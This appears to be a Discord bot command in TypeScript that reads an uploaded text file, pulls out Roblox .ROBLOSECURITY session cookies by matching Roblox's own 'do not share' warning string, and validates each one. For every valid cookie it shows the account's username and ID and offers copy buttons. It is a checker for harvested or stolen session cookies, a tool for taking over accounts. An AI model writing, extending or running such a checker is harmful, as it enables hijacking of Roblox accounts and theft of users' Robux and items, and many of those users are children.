import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  type ChatInputCommandInteraction,
} from 'discord.js';
import axios from 'axios';
import { validateCookie } from '../roblox';

const cookieStore = new Map<string, { cookie: string; timestamp: number }>();

setInterval(() => {
  const now = Date.now();
  for (const [key, entry] of cookieStore) {
    if (now - entry.timestamp > 10 * 60 * 1000) cookieStore.delete(key);
  }
}, 60_000);

function storeAndBuildRow(cookie: string): ActionRowBuilder<ButtonBuilder> {
  const id = Math.random().toString(36).substring(2, 10);
  cookieStore.set(id, { cookie, timestamp: Date.now() });
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`cookie_mobile_${id}`)
      .setLabel('📱 Mobile Copy')
      .setStyle(ButtonStyle.Primary),
    new ButtonBuilder()
      .setCustomId(`cookie_pc_${id}`)
      .setLabel('💻 PC Copy')
      .setStyle(ButtonStyle.Secondary),
  );
}

const COOKIE_REGEX = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[\w.\-+=\/]+/g;

export const ccheckerCommand = new SlashCommandBuilder()
  .setName('cchecker')
  .setDescription('Check a .txt file for valid Roblox cookies')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption(opt =>
    opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
  );

export async function handleCchecker(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ ephemeral: true });

  const attachment = interaction.options.getAttachment('file', true);

  if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
    await interaction.editReply('❌ Please attach a `.txt` file.');
    return;
  }

  let fileContent: string;
  try {
    const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
    fileContent = resp.data;
  } catch (err: any) {
    await interaction.editReply(`❌ Failed to download file: ${err.message}`);
    return;
  }

  const matches = fileContent.match(COOKIE_REGEX);
  const unique = [...new Set(matches ?? [])];

  if (unique.length === 0) {
    await interaction.editReply('⚠️ No Roblox cookies found in the file.');
    return;
  }

  await interaction.editReply(`🔍 Found **${unique.length}** cookie(s). Checking…`);

  let validCount = 0;

  for (const cookie of unique) {
    const result = await validateCookie(cookie);
    if (!result.valid) continue;

    validCount++;
    const row = storeAndBuildRow(cookie);

    await interaction.followUp({
      content: `✅ **Valid cookie #${validCount}**\n👤 \`${result.username}\` (${result.displayName}) — ID \`${result.userId}\``,
      components: [row],
      ephemeral: true,
    });
  }

  const summary =
    validCount === 0
      ? `✅ Done — **0 valid cookies** found out of ${unique.length} checked.`
      : `✅ Done — **${validCount} valid** / ${unique.length} total cookies found.`;

  await interaction.followUp({ content: summary, ephemeral: true });
}
